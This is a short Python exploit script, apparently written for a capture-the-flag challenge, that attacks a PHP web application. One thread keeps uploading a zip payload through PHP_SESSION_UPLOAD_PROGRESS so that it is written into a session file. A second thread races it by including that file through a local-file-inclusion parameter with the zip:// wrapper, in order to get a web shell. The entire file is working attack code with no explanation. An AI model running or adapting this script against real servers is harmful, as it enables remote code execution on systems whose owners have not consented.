import io
import requests
import threading

URL = 'http://eci-2zefzwp8uhdy0c08bpdr.cloudeci1.ichunqiu.com/index.php'
# PATH = '/var/lib/php/sessions'
PATH = '/tmp'
SESSIONID = 'hosch3n'
LFI = f'{URL}?f=zip://{PATH}/sess_{SESSIONID}%23shell'
# EVAL = '<?=file_put_contents("temp.php","<?=phpinfo();")?>'
EVAL = open('shell.zip', 'rb')


def t1(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 50)
        response = session.post(
            URL,
            data={'PHP_SESSION_UPLOAD_PROGRESS': EVAL},
            files={'file': ('avatar.png', f)},
            cookies={'PHPSESSID': SESSIONID}
        )

def t2(session):
    while True:
        response = session.get(LFI)
        print(response.text)

with requests.session() as session:
    t1 = threading.Thread(target=t1, args=(session, ))
    t1.daemon = True
    t1.start()

    t2(session)